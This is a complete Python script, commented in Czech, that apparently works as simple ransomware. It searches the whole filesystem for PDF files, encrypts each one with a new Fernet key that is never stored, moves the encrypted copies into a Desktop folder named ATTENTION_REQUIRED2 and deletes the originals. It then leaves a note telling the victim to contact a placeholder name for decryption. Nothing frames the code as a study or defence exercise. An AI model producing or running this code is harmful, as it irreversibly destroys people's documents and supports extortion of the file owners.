import os
from cryptography.fernet import Fernet
import shutil

def find_pdfs():
  """
  Funkce pro vyhledávání všech PDF souborů v PC.

  Vrací:
    Seznam cest k nalezeným PDF souborům.
  """
  pdf_files = []
  for root, _, files in os.walk("/"):
    for file in files:
      if file.endswith(".pdf"):
        pdf_files.append(os.path.join(root, file))
  return pdf_files

def encrypt_file(file_path):
  """
  Funkce pro šifrování souboru a jeho přesun do složky ATTENTION_REQUIRED2 na ploše.

  Argumenty:
    file_path: Cesta k souboru, který se má šifrovat.

  Vrací:
    Cestu k zašifrovanému souboru (nebo `None` v případě chyby).
  """

  original_filename = os.path.basename(file_path)

  try:
    # Vytvoření složky ATTENTION_REQUIRED2 na ploše, pokud neexistuje
    desktop_path = os.path.join(os.getenv("USERPROFILE"), "Desktop")
    attention_folder_path = os.path.join(desktop_path, "ATTENTION_REQUIRED2")
    if not os.path.exists(attention_folder_path):
      os.mkdir(attention_folder_path)

    # Šifrování souboru
    with open(file_path, 'rb') as f_in:
      data = f_in.read()

    key = Fernet.generate_key()
    fernet_instance = Fernet(key)
    encrypted_data = fernet_instance.encrypt(data)

    encrypted_file_path = file_path + ".encrypted"
    with open(encrypted_file_path, 'wb') as f_out:
      f_out.write(encrypted_data)

    # Přesun zašifrovaného souboru do složky ATTENTION_REQUIRED2
    new_file_path = os.path.join(attention_folder_path, original_filename)
    os.rename(encrypted_file_path, new_file_path)

    # Smazání originálního souboru
    os.remove(file_path)

    # Vytvoření TXT souboru s textem
    text_file_path = os.path.join(attention_folder_path, "Důležité informace.txt")
    with open(text_file_path, 'w', encoding="utf-8") as f_out:
      f_out.write("**Důležité informace:**\n\nObsahuje zašifrované soubory.\n\nProsím, kontaktujte [Vaše jméno] pro dešifrování.\n")

    print(f"Soubor '{original_filename}' zašifrován a přesunut do: {new_file_path}")
    print(f"Originální soubor '{original_filename}' smazán.")
    print(f"TXT soubor s důležitými informacemi vytvořen: {text_file_path}")

    return new_file_path
  except Exception as e:
    print(f"Chyba při šifrování souboru '{original_filename}': {e}")
    return None

def main():
  pdf_files = find_pdfs()

  if pdf_files:
    print(f"Nalezeno {len(pdf_files)} PDF souborů:")
    for pdf_file in pdf_files:
      print(f"- {pdf_file}")
    print()

    for pdf_file in pdf_files:
      encrypted_file_path = encrypt_file(pdf_file)
      if not encrypted_file_path:
        print(f"Soubor '{pdf_file}' nebyl zašifrován.")
  else:
    print("Žádné PDF soubory nebyly nalezeny.")

if __name__ == "__main__":
  main()
